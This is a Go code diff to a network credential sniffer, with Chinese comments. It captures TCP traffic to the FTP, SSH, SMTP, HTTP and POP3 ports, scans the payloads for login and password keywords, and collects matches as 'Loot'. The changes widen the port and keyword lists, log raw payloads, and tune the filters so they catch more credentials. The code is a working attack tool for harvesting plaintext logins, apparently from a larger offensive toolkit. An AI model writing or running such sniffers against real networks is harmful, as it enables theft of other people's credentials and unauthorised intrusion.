@@ -31,12 +31,12 @@ func Sniff() error {
 		log.Printf("OpenLive Error:%v", err)
 		return err
 	}
-	defer handle.Close()
+	// defer handle.Close() //不能关，子协程还要用
 	//2.设置过滤器
-	ports := []int{21, 80, 25, 110}
+	ports := []int{21, 22, 25, 80, 110}
 	filters := make([]string, 0, len(ports))
 	for _, port := range ports {
-		filters = append(filters, fmt.Sprintf("tcp and dst port %d", port))
+		filters = append(filters, fmt.Sprintf("(tcp and dst port %d)", port))
 	}
 	filter := strings.Join(filters, " or ")
 	debug.Println(filter)
@@ -82,10 +82,8 @@ func DigPacket(ctx context.Context, handle *pcap.Handle) <-chan *models.Loot {
 			vars.SniffCancelFunc = nil
 		}()
 		//3.创建数据源
-		src := gopacket.NewPacketSource(handle, layers.LayerTypeIPv4)
+		src := gopacket.NewPacketSource(handle, handle.LinkType())
 		for packet := range src.Packets() {
-			log.Println(1)
-
 			//4.1解析IP层获取 srcIP 和 dstIP
 			ipLayer := packet.Layer(layers.LayerTypeIPv4)
 			if ipLayer == nil {
@@ -97,6 +95,7 @@ func DigPacket(ctx context.Context, handle *pcap.Handle) <-chan *models.Loot {
 			//4.2 解析TCP层 获取 srcPort 和 dstPort
 			tcpLayer := packet.Layer(layers.LayerTypeTCP)
 			if tcpLayer == nil {
+				debug.Println("packet.Layer(layers.LayerTypeTCP) is null")
 				continue
 			}
 			tcp := tcpLayer.(*layers.TCP)
@@ -108,6 +107,7 @@ func DigPacket(ctx context.Context, handle *pcap.Handle) <-chan *models.Loot {
 				continue
 			}
 			payload := application.Payload()
+			log.Println(string(payload))
 			exist, keyword := checkKeyword(payload)
 			if !exist {
 				continue
@@ -135,7 +135,8 @@ func DigPacket(ctx context.Context, handle *pcap.Handle) <-chan *models.Loot {
 
 //checkKeyword 检查payload中是否含有关键字
 func checkKeyword(payload []byte) (bool, string) {
-	keywords := []string{"user", "usr", "login", "manager", "name", "admin", "pass", "pwd"}
+	keywords := []string{"username", "uname", "u_name", "user_name", "usr", "login", "manager", "name", "admin", "pass", "pwd"}
+	//不能嗅探user，因为user-agent 几乎每个http报文中都有
 	//1.将payloads 转化为小写
 	payload = bytes.ToLower(payload)
 	//2.比对是否有关键字
